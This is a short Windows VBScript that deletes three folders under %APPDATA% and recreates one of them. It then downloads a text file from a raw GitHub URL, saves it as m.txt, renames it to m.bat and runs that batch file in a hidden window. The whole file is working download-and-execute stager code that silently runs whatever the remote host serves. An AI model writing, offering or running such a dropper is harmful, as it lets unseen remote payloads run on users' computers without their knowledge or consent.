Set fso = CreateObject("Scripting.FileSystemObject")
Set sh = CreateObject("WScript.Shell")
appdata = sh.ExpandEnvironmentStrings("%APPDATA%")

' Delete existing folders if they exist
paged = appdata & "\Paged"
If fso.FolderExists(paged) Then fso.DeleteFolder paged, True

paged_l = appdata & "\Paged-l"
If fso.FolderExists(paged_l) Then fso.DeleteFolder paged_l, True

grok_l = appdata & "\Grok-l"
If fso.FolderExists(grok_l) Then fso.DeleteFolder grok_l, True

' Create new folder
If Not fso.FolderExists(paged_l) Then fso.CreateFolder(paged_l)

' Create l.txt
Set file1 = fso.CreateTextFile(paged_l & "\l.txt", True)
file1.WriteLine "----"
file1.Close

' Download and create m.txt
Set file2 = fso.CreateTextFile(paged_l & "\m.txt", True)
Set http = CreateObject("MSXML2.XMLHTTP")
http.Open "GET", "https://raw.githubusercontent.com/Zenth-grid/ZENTH-MAIN/main/V/Main.txt", False
http.Send
file2.Write http.responseText
file2.Close

' Wait and rename m.txt to m.bat
WScript.Sleep 5000
fso.MoveFile paged_l & "\m.txt", paged_l & "\m.bat"
WScript.Sleep 3000

' Run m.bat if it exists
If fso.FileExists(paged_l & "\m.bat") Then
    sh.Run Chr(34) & paged_l & "\m.bat" & Chr(34), 0, False
Else
    WScript.Echo "Error: m.bat not found in " & paged_l
End If
